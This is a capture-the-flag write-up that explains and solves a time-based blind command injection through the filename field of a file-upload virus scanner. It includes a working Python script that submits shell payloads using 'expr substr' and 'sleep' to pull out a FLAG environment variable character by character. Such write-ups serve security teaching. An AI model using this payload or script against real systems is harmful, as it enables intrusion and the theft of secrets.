### Virus Vault - Blind CMD Injection


> x Exam (31)

Observation of the application architecture reveals a file upload mechanism designed to scan submitted files for malicious signatures. Analysis of the input handling procedures demonstrates that the filename parameter within the file upload process lacks proper sanitization, allowing direct concatenation into an underlying shell command execution context. The primary objective is the extraction of a sensitive environment variable designated as **FLAG**.

> **Time Based Blind Command Injection** is a technique utilized to extract data from a vulnerable system when direct output is unavailable, relying on measuring the execution time of injected commands that purposefully delay the server response based on boolean logic.

Because network egress filtering specifically restricts the forward slash character, standard exfiltration methods utilizing out of band HTTP GET requests to external domains are rendered ineffective. Consequently, a time based blind command injection methodology must be employed to iteratively extract the target variable character by character. The payload is logically structured to evaluate whether a specified substring of the environment variable matches a predefined candidate string, and upon a successful match, the server is instructed to pause execution, allowing the observer to infer the correct character through latency measurement.

The implementation below automates this extraction process by systematically iterating through the potential character set, submitting the crafted payload within the filename parameter of a multipart request, and evaluating the response time to reconstruct the complete flag.



```Python
import requests
import time
import string

def check(url, candidate):
    payload = f'$(if [ $(expr substr $FLAG 1 {len(candidate)}) = {candidate} ]; then sleep 3; fi)'
    
    files = {
        'specimen': (
            payload,
            'This is a test virus file.',
            'text/plain'
        )
    }
    start = time.time()
    res = requests.post(url, files=files)
    return time.time() - start > 0.8

def main():
    url = "https://26847a2d-1fe0-4473-a4a0-977e207877a1.offsec.m0lecon.it/scan"
    flag = ""
    charset = string.ascii_letters + string.digits + string.punctuation

    while True:
        found = False
        for char in charset:
            candidate = flag + char
            print(f"Testing: {candidate}", end="\r")
            if check(url, candidate):
                flag = candidate
                print(f"[+] Flag so far: {flag}")
                found = True
                break
        if not found:
            print(f"\n[!] Flag finale: {flag}")
            break

if __name__ == "__main__":
    main()
```